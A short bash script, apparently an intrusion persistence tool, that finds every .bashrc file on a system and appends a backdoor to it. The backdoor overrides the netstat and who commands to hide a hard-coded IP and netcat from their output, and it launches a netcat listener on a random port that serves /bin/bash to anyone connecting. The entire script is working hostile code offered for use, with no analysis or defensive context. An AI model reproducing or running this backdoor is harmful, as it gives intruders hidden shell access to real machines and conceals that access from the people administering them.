#! /bin/bash

RED='\033[0;31m'
NOCOLOR='\033[0m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
ip="192.168.75.142"
write="""
netstat(){ x=\$(which netstat); \$x "\$@" | grep -v $ip | grep -v nc; };\nwho() { x=\$(which who); \$x "\$@" | grep -v \"$ip\"; };\nnc -lp \$(((\$RANDOM % 1000) + 1023)) -e /bin/bash &
"""

echo -e [ ${RED}SEARCHING...${NOCOLOR} ]
files=$(find / -name *.bashrc)
echo -e "[ ${GREEN}SEARCH DONE${NOCOLOR} ]"
for x in $files; do
    echo -e [ FOUND $x ${RED}UPLOADING...${NOCOLOR} ]
    echo -e $write >> $x
done
